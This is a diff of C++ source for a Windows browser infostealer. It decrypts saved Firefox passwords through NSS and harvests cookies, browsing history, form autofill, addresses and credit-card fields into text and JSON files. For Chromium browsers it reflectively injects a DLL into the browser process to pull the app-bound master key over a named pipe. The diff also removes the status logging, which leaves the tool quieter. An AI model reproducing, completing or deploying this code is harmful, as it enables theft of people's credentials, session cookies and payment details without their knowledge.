@@ -10,6 +10,7 @@
 #include <ctime>
 #include <iomanip>
 #include <sstream>
+#include <regex>
 #include <cctype>
 #include <cwctype>
 #include <shlobj.h>
@@ -24,8 +25,6 @@
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
-
-enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };
 
 struct PasswordData { std::string url, username, password; };
 struct CookieData {
@@ -297,332 +296,147 @@ struct SECItem { int type; unsigned char* data; unsigned int len; };
 typedef SECStatus(*NSSInit_t)(const char*); typedef SECStatus(*NSSShutdown_t)(void); typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);
 
 void collect_firefox(const BrowserConfig& browser) {
-    std::wcout << L"\n--- Processing Firefox-based Browser: " << browser.name << L" ---" << std::endl;
-    wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
-    std::error_code ec; fs::path browser_dir = extractor_root / browser.name; fs::create_directories(browser_dir, ec);
-
-    wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) {
-        std::cerr << "[-] Failed to get CSIDL folder " << browser.csidl_folder << std::endl;
-        return;
-    }
+    wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
     fs::path data_path = fs::path(sz_path) / browser.data_path_relative;
-    std::wcout << L"[*] Data Path: " << data_path.wstring() << std::endl;
-    if (!fs::exists(data_path)) {
-        std::cerr << "[-] Data path does not exist." << std::endl;
-        return;
-    }
+    if (!fs::exists(data_path)) return;
 
-    std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini";
+    std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini"; std::error_code ec;
     if (fs::exists(ini_path)) {
-        std::cout << "[*] Parsing profiles.ini..." << std::endl;
-        std::ifstream file(ini_path); std::string line, section;
-        std::map<std::string, std::map<std::string, std::string>> sections;
+        std::ifstream file(ini_path); std::string line, section; std::map<std::string, std::map<std::string, std::string>> sections;
         while (std::getline(file, line)) {
-            if (!line.empty() && line.back() == '\r') line.pop_back();
-            if (line.empty()) continue;
-            if (line[0] == '[') {
-                size_t end = line.find(']');
-                if (end != std::string::npos) section = line.substr(1, end - 1);
-            } else {
-                size_t pos = line.find('=');
-                if (pos != std::string::npos) sections[section][line.substr(0, pos)] = line.substr(pos + 1);
-            }
+            if (!line.empty() && line.back() == '\r') line.pop_back(); if (line.empty()) continue;
+            if (line[0] == '[') { size_t end = line.find(']'); if (end != std::string::npos) section = line.substr(1, end - 1); }
+            else { size_t pos = line.find('='); if (pos != std::string::npos) sections[section][line.substr(0, pos)] = line.substr(pos + 1); }
         }
         for (auto const& [s_name, props] : sections) {
             if (props.count("Path")) {
                 bool is_rel = (props.count("IsRelative") && props.at("IsRelative") == "1");
-                std::string p_str = props.at("Path");
-                fs::path p = is_rel ? (data_path / p_str) : fs::path(p_str);
+                std::string p_str = props.at("Path"); fs::path p = is_rel ? (data_path / p_str) : fs::path(p_str);
                 if (!fs::exists(p)) p = data_path / "Profiles" / p_str;
-                if (fs::exists(p)) {
-                    bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, p)) dup = true; } catch(...) {} }
-                    if (!dup) {
-                        std::cout << "[+] Found profile path: " << p.string() << std::endl;
-                        profile_paths.push_back(p);
-                    }
-                }
+                if (fs::exists(p)) { bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, p)) dup = true; } catch(...) {} } if (!dup) profile_paths.push_back(p); }
             }
         }
     }
-
-    if (true) { // Always check for extra profiles
-        std::cout << "[*] Searching for additional profiles in direct directories..." << std::endl;
+    {
         std::vector<fs::path> roots = { data_path, data_path / "Profiles" };
-
-        // Also check Store App virtualized path
-        wchar_t local_appdata[MAX_PATH];
-        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
+        wchar_t local_appdata[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
             fs::path store_base = fs::path(local_appdata) / "Packages";
-            for (const auto& entry : fs::directory_iterator(store_base, ec)) {
-                if (entry.is_directory() && entry.path().filename().string().find("Mozilla.Firefox") != std::string::npos) {
-                    fs::path sp = entry.path() / "LocalCache" / "Roaming" / "Mozilla" / "Firefox" / "Profiles";
-                    if (fs::exists(sp)) roots.push_back(sp);
-                }
-            }
+            for (const auto& entry : fs::directory_iterator(store_base, ec)) { if (entry.is_directory() && entry.path().filename().string().find("Mozilla.Firefox") != std::string::npos) { fs::path sp = entry.path() / "LocalCache" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"; if (fs::exists(sp)) roots.push_back(sp); } }
         }
-
         for (auto& p_root : roots) {
-            if (fs::exists(p_root)) {
-                for (const auto& entry : fs::directory_iterator(p_root, ec)) {
-                    if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) {
-                        bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, entry.path())) dup = true; } catch(...) {} }
-                        if (!dup) {
-                            std::cout << "[+] Found directory profile: " << entry.path().string() << std::endl;
-                            profile_paths.push_back(entry.path());
-                        }
-                    }
-                }
-            }
+            if (fs::exists(p_root)) { for (const auto& entry : fs::directory_iterator(p_root, ec)) { if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) { bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, entry.path())) dup = true; } catch(...) {} } if (!dup) profile_paths.push_back(entry.path()); } } }
         }
     }
-
-    if (profile_paths.empty()) {
-        std::cerr << "[-] No profiles found for " << browser.name.c_str() << std::endl;
-        return;
-    }
+    if (profile_paths.empty()) return;
 
     std::wstring b_exe = find_browser_exe(browser.name);
-    if (b_exe.empty()) {
-        DWORD pid = find_main_process(browser.exe_name);
-        if (pid) {
-            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
-            if (h) {
-                wchar_t buf[MAX_PATH]; DWORD sz = MAX_PATH;
-                if (QueryFullProcessImageNameW(h, 0, buf, &sz)) b_exe = buf;
-                CloseHandle(h);
-            }
-        }
-    }
-    if (b_exe.empty()) {
-        std::cerr << "[-] Browser executable not found for " << browser.name.c_str() << std::endl;
-        return;
-    }
+    if (b_exe.empty()) { DWORD pid = find_main_process(browser.exe_name); if (pid) { HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (h) { wchar_t buf[MAX_PATH]; DWORD sz = MAX_PATH; if (QueryFullProcessImageNameW(h, 0, buf, &sz)) b_exe = buf; CloseHandle(h); } } }
+    if (b_exe.empty()) return;
     fs::path bin_dir = fs::path(b_exe).parent_path();
+
     HMODULE h_nss = NULL; NSSInit_t f_NSS_Init = nullptr; NSSShutdown_t f_NSS_Shutdown = nullptr; PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
     wchar_t saved_cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, saved_cwd); SetCurrentDirectoryW(bin_dir.c_str());
     h_nss = LoadLibraryW(L"nss3.dll");
-    if (h_nss) {
-        f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init");
-        f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown");
-        f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt");
-        std::cout << "[+] Loaded nss3.dll from " << bin_dir.string() << std::endl;
-    } else {
-        std::cerr << "[-] Failed to load nss3.dll from " << bin_dir.string() << ". Error: " << GetLastError() << std::endl;
-    }
+    if (h_nss) { f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init"); f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown"); f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt"); }
     SetCurrentDirectoryW(saved_cwd);
 
     wchar_t temp_base[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
     fs::path temp_dir = fs::path(temp_base) / "Temp" / ("firefox_db_" + std::to_string(GetTickCount())); fs::create_directories(temp_dir, ec);
 
+    wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
+    fs::path base_browser_dir = extractor_root / "browser" / browser.name;
+
     for (const auto& p_path : profile_paths) {
-        std::string p_name = p_path.filename().string(); std::cout << "[+] Found Profile: " << p_name << std::endl;
-        ProfileData p_data; p_data.name = p_name; std::string p_name_sanit = p_name; std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
+        std::string p_name = p_path.filename().string(); ProfileData p_data; p_data.name = p_name;
+        std::string p_name_sanit = p_name; std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_'); std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
 
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
             fs::path min_p = temp_dir / (p_name_sanit + "_nss"); fs::create_directories(min_p, ec);
-            std::cout << "[*] Copying NSS databases to " << min_p.string() << std::endl;
             copy_file_locked(p_path / "key4.db", min_p / "key4.db"); copy_file_locked(p_path / "key3.db", min_p / "key3.db"); copy_file_locked(p_path / "cert9.db", min_p / "cert9.db"); copy_file_locked(p_path / "logins.json", min_p / "logins.json");
-
-            SetCurrentDirectoryW(bin_dir.c_str());
-            std::string p_str = min_p.string();
-            // NSS prefers forward slashes on some versions, and MUST NOT have trailing slash
-            std::replace(p_str.begin(), p_str.end(), '\\', '/');
-            if (p_str.back() == '/') p_str.pop_back();
-
-            bool inited = false;
-            if (fs::exists(min_p / "key4.db")) {
-                std::cout << "[*] Attempting NSS_Init with sql:" << p_str << std::endl;
-                if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true;
-                else std::cerr << "[-] NSS_Init(sql:...) failed." << std::endl;
-            }
-            if (!inited) {
-                std::cout << "[*] Attempting NSS_Init without sql prefix..." << std::endl;
-                if (f_NSS_Init(p_str.c_str()) == SECSuccess) inited = true;
-            }
-
+            SetCurrentDirectoryW(bin_dir.c_str()); std::string p_str = min_p.string(); std::replace(p_str.begin(), p_str.end(), '\\', '/'); if (p_str.back() == '/') p_str.pop_back();
+            bool inited = false; if (fs::exists(min_p / "key4.db")) { if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true; }
             if (inited) {
-                std::cout << "[+] NSS Initialized successfully." << std::endl;
-                fs::path login_f = min_p / "logins.json";
-                if (fs::exists(login_f)) {
+                fs::path login_f = min_p / "logins.json"; if (fs::exists(login_f)) {
                     std::ifstream lf(login_f); json lj = json::parse(lf, nullptr, false);
                     if (!lj.is_discarded() && lj.contains("logins")) {
-                        std::cout << "[+] Found " << lj["logins"].size() << " entries in logins.json" << std::endl;
                         for (auto& login : lj["logins"]) {
                             std::string enc_u = login["encryptedUsername"], enc_p = login["encryptedPassword"], url = login["hostname"];
                             auto db_u = base64_decode(enc_u); auto db_p = base64_decode(enc_p);
-                            SECItem in_u = { 0, db_u.data(), (unsigned int)db_u.size() }, out_u = { 0, nullptr, 0 };
-                            SECItem in_p = { 0, db_p.data(), (unsigned int)db_p.size() }, out_p = { 0, nullptr, 0 };
+                            SECItem in_u = { 0, db_u.data(), (unsigned int)db_u.size() }, out_u = { 0, nullptr, 0 }, in_p = { 0, db_p.data(), (unsigned int)db_p.size() }, out_p = { 0, nullptr, 0 };
                             std::string u = enc_u, p = enc_p;
-                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess && out_u.data) {
-                                u = std::string((char*)out_u.data, out_u.len);
-                            } else { std::cerr << "[-] Failed to decrypt username for " << url << std::endl; }
-
-                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess && out_p.data) {
-                                p = std::string((char*)out_p.data, out_p.len);
-                            } else { std::cerr << "[-] Failed to decrypt password for " << url << std::endl; }
+                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess && out_u.data) u = std::string((char*)out_u.data, out_u.len);
+                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess && out_p.data) p = std::string((char*)out_p.data, out_p.len);
                             p_data.passwords.push_back({ url, u, p });
                         }
-                    } else {
-                        std::cerr << "[-] logins.json is empty or invalid." << std::endl;
                     }
-                } else {
-                    std::cerr << "[-] logins.json not found in temp dir." << std::endl;
                 }
                 f_NSS_Shutdown();
-            } else {
-                std::cerr << "[-] NSS_Init failed for " << p_name << std::endl;
             }
             SetCurrentDirectoryW(saved_cwd);
-        } else {
-            std::cerr << "[-] NSS functions not loaded, skipping password extraction." << std::endl;
         }
         fs::path c_db = p_path / "cookies.sqlite"; fs::path tc_db = temp_dir / (p_name_sanit + "_cook.tmp");
-        if (copy_db_with_sidecars(c_db, tc_db)) {
-            sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(tc_db.wstring()), &db) == SQLITE_OK) {
-                sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
-                    while (sqlite3_step(stmt) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), get_sqlite_text(stmt, 2), get_sqlite_text(stmt, 3), (sqlite3_column_int64(stmt, 4) + 11644473600LL) * 1000000, sqlite3_column_int(stmt, 5), sqlite3_column_int(stmt, 6), 0 });
-                    sqlite3_finalize(stmt);
-                }
-                sqlite3_close(db);
-            }
-            cleanup_db_temp(tc_db);
-        }
+        if (copy_db_with_sidecars(c_db, tc_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(tc_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.cookies.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), get_sqlite_text(stmt, 2), get_sqlite_text(stmt, 3), (sqlite3_column_int64(stmt, 4) + 11644473600LL) * 1000000, sqlite3_column_int(stmt, 5), sqlite3_column_int(stmt, 6), 0 }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(tc_db); }
         fs::path h_db = p_path / "places.sqlite"; fs::path th_db = temp_dir / (p_name_sanit + "_hist.tmp");
-        if (copy_db_with_sidecars(h_db, th_db)) {
-            sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(th_db.wstring()), &db) == SQLITE_OK) {
-                sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM moz_places LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
-                    while (sqlite3_step(stmt) == SQLITE_ROW) { p_data.history.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), sqlite3_column_int(stmt, 2) }); }
-                    sqlite3_finalize(stmt);
-                }
-                sqlite3_close(db);
-            }
-            cleanup_db_temp(th_db);
-        }
+        if (copy_db_with_sidecars(h_db, th_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(th_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM moz_places LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.history.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1), sqlite3_column_int(stmt, 2) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(th_db); }
         fs::path a_db = p_path / "formhistory.sqlite"; fs::path ta_db = temp_dir / (p_name_sanit + "_auto.tmp");
-        if (copy_db_with_sidecars(a_db, ta_db)) {
-            sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(ta_db.wstring()), &db) == SQLITE_OK) {
-                sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) {
-                    while (sqlite3_step(stmt) == SQLITE_ROW) { p_data.autofill.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1) }); }
-                    sqlite3_finalize(stmt);
-                }
-                sqlite3_close(db);
-            }
-            cleanup_db_temp(ta_db);
-        }
-        fs::path aj_path = p_path / "autofill-profiles.json"; if (fs::exists(aj_path)) {
-            std::ifstream f(aj_path); json aj = json::parse(f, nullptr, false);
-            if (!aj.is_discarded()) {
-                if (aj.contains("addresses")) for (auto& i : aj["addresses"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
-                if (aj.contains("creditCards")) for (auto& i : aj["creditCards"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
-            }
-        }
-        fs::path p_dir = browser_dir / p_name_sanit;
-        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
-            fs::create_directories(p_dir, ec);
-            std::cout << "[+] Saving data to " << p_dir.string() << std::endl;
-        } else {
-            std::cout << "[!] No data collected for profile " << p_name << ", skipping folder creation." << std::endl;
-            continue;
-        }
+        if (copy_db_with_sidecars(a_db, ta_db)) { sqlite3* db; if (open_db_for_extraction(wstring_to_utf8(ta_db.wstring()), &db) == SQLITE_OK) { sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) { while (sqlite3_step(stmt) == SQLITE_ROW) p_data.autofill.push_back({ get_sqlite_text(stmt, 0), get_sqlite_text(stmt, 1) }); sqlite3_finalize(stmt); } sqlite3_close(db); } cleanup_db_temp(ta_db); }
+        fs::path aj_path = p_path / "autofill-profiles.json"; if (fs::exists(aj_path)) { std::ifstream f(aj_path); json aj = json::parse(f, nullptr, false); if (!aj.is_discarded()) { if (aj.contains("addresses")) for (auto& i : aj["addresses"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() }); if (aj.contains("creditCards")) for (auto& i : aj["creditCards"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() }); } }
 
-        try {
-            std::ofstream f_pass(p_dir / "passwords.txt"); json j_pass = json::array();
-            for (auto& p : p_data.passwords) { f_pass << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n"; j_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}}); }
-            f_pass.close(); std::ofstream(p_dir / "passwords.json") << j_pass.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
-            std::ofstream f_cook(p_dir / "cookies.txt"); json j_cook = json::array();
-            for (auto& c : p_data.cookies) {
-                f_cook << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
-                json cj; std::string hr = c.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
-                cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(c.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(c.value);
-                long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64];
-                if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
-                cj["Expires raw"] = std::to_string(ut); cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = c.is_secure ? "true" : "false"; cj["HTTP only raw"] = c.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (c.host[0] == '.') ? "false" : "true";
-                j_cook.push_back(cj);
-            }
-            f_cook.close(); std::ofstream(p_dir / "cookies.json") << j_cook.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
-            std::ofstream f_hist(p_dir / "history.txt"); json j_hist = json::array(); for (auto& h : p_data.history) { f_hist << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); }
-            f_hist.close(); std::ofstream(p_dir / "history.json") << j_hist.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
-            std::ofstream f_auto(p_dir / "autofill.txt"); json j_auto = json::array(); for (auto& a : p_data.autofill) { f_auto << "Name: " << a.name << " | Value: " << a.value << "\n"; j_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); }
-            f_auto.close(); std::ofstream(p_dir / "autofill.json") << j_auto.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
-            std::cout << "[+] Saved data for profile: " << p_name << std::endl;
-        } catch (...) {}
+        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
+            fs::path p_dir = base_browser_dir / p_name_sanit; fs::create_directories(p_dir, ec);
+            try {
+                std::ofstream f_pass(p_dir / "passwords.txt"); json j_pass = json::array(); for (auto& p : p_data.passwords) { f_pass << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n"; j_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}}); } f_pass.close(); std::ofstream(p_dir / "passwords.json") << j_pass.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                std::ofstream f_cook(p_dir / "cookies.txt"); json j_cook = json::array(); for (auto& c : p_data.cookies) {
+                    f_cook << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+                    json cj; std::string hr = c.host; if (hr.find("http") != 0) hr = "https://" + (hr[0] == '.' ? hr.substr(1) : hr); if (hr.back() != '/') hr += "/";
+                    cj["Host raw"] = ensure_utf8(hr); cj["Name raw"] = ensure_utf8(c.name); cj["Path raw"] = ensure_utf8(c.path); cj["Content raw"] = ensure_utf8(c.value);
+                    long long ut = (c.expires_utc / 1000000) - 11644473600LL; std::time_t t = (std::time_t)ut; struct tm *tmp = std::gmtime(&t); char dbuf[64]; if (tmp && std::strftime(dbuf, sizeof(dbuf), "%d-%m-%Y %H:%M:%S", tmp)) cj["Expires"] = std::string(dbuf);
+                    cj["Expires raw"] = std::to_string(ut); cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection"; cj["Send for raw"] = c.is_secure ? "true" : "false"; cj["HTTP only raw"] = c.is_httponly ? "true" : "false"; cj["SameSite raw"] = "no_restriction"; cj["This domain only"] = (c.host[0] == '.') ? "false" : "true"; j_cook.push_back(cj);
+                } f_cook.close(); std::ofstream(p_dir / "cookies.json") << j_cook.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                std::ofstream f_hist(p_dir / "history.txt"); json j_hist = json::array(); for (auto& h : p_data.history) { f_hist << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n"; j_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}}); } f_hist.close(); std::ofstream(p_dir / "history.json") << j_hist.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+                std::ofstream f_auto(p_dir / "autofill.txt"); json j_auto = json::array(); for (auto& a : p_data.autofill) { f_auto << "Name: " << a.name << " | Value: " << a.value << "\n"; j_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}}); } f_auto.close(); std::ofstream(p_dir / "autofill.json") << j_auto.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+            } catch (...) {}
+        }
     }
     fs::remove_all(temp_dir, ec);
 }
 
 void inject_and_collect(const std::vector<unsigned char>& dll, const BrowserConfig& browser) {
-    std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;
-    wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path(); std::error_code ec;
+    wchar_t sz[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) != S_OK) return;
+    fs::path data = fs::path(sz) / browser.data_path_relative; if (!fs::exists(data)) return;
+
+    std::vector<std::string> profs; if (fs::exists(data / "Login Data")) profs.push_back("."); if (fs::exists(data / "Default")) profs.push_back("Default");
+    std::error_code ec; if (fs::exists(data)) { for (const auto& e : fs::directory_iterator(data, ec)) { if (e.is_directory() && e.path().filename().string().find("Profile ") == 0) profs.push_back(e.path().filename().string()); } }
+    if (fs::exists(data / "Side Profiles")) { for (const auto& e : fs::directory_iterator(data / "Side Profiles", ec)) { if (e.is_directory()) profs.push_back("Side Profiles/" + e.path().filename().string()); } }
+    if (profs.empty()) return;
+
+    wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
+    fs::path base_browser_dir = extractor_root / "browser" / browser.name;
+
     HANDLE h_proc = NULL; bool started = false; PROCESS_INFORMATION pi = {0};
     if (browser.use_injection) {
         DWORD pid = find_main_process(browser.exe_name); if (pid) h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-        if (!h_proc) {
-            std::wstring cmd = find_browser_exe(browser.name); if (cmd.empty()) cmd = browser.exe_name;
-            cmd = L"\"" + cmd + L"\" --headless=new --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-            std::vector<wchar_t> buf(cmd.begin(), cmd.end()); buf.push_back(0); STARTUPINFOW si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-            if (CreateProcessW(NULL, buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { h_proc = pi.hProcess; started = true; }
-            else { std::wcerr << L"Failed to start " << browser.exe_name << std::endl; return; }
-        }
+        if (!h_proc) { std::wstring cmd = find_browser_exe(browser.name); if (cmd.empty()) cmd = browser.exe_name; cmd = L"\"" + cmd + L"\" --headless=new --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank"; std::vector<wchar_t> buf(cmd.begin(), cmd.end()); buf.push_back(0); STARTUPINFOW si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; if (CreateProcessW(NULL, buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { h_proc = pi.hProcess; started = true; } else return; }
     }
     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    if (browser.use_injection) {
-        h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
-        inject_dll_reflective(h_proc, dll); if (started) { ResumeThread(pi.hThread); Sleep(500); }
-    }
-    std::vector<unsigned char> v10, v20; wchar_t sz[MAX_PATH];
-    if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz) == S_OK) {
-        fs::path data = fs::path(sz) / browser.data_path_relative;
-        { std::ifstream f(data / "Local State"); if (f) { json j = json::parse(f, nullptr, false); if (!j.is_discarded() && j.contains("os_crypt")) { auto b = base64_decode(j["os_crypt"]["encrypted_key"]); if (b.size() > 5) v10 = decrypt_dpapi(std::vector<unsigned char>(b.begin() + 5, b.end())); } } }
-        if (browser.use_injection && h_pipe != INVALID_HANDLE_VALUE) {
-            std::cout << "[*] Waiting for DLL connection..." << std::endl;
-            if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
-                std::cout << "[+] DLL Connected successfully!" << std::endl;
-                unsigned char buf[1024]; DWORD r;
-                if (ReadFile(h_pipe, buf, sizeof(buf), &r, NULL) && r > 0) {
-                    v20.assign(buf, buf + r);
-                    std::cout << "[+] Successfully retrieved v20 Master Key (" << r << " bytes)" << std::endl;
-                } else {
-                    std::cerr << "[-] Failed to read from pipe. Error: " << GetLastError() << std::endl;
-                }
-            } else {
-                std::cerr << "[-] Named pipe connection failed. Error: " << GetLastError() << std::endl;
-            }
-            CloseHandle(h_pipe);
-        }
-        std::vector<std::string> profs; if (fs::exists(data / "Login Data")) profs.push_back("."); if (fs::exists(data / "Default")) profs.push_back("Default");
-        if (fs::exists(data)) { for (const auto& e : fs::directory_iterator(data)) { if (e.is_directory() && e.path().filename().string().find("Profile ") == 0) profs.push_back(e.path().filename().string()); } }
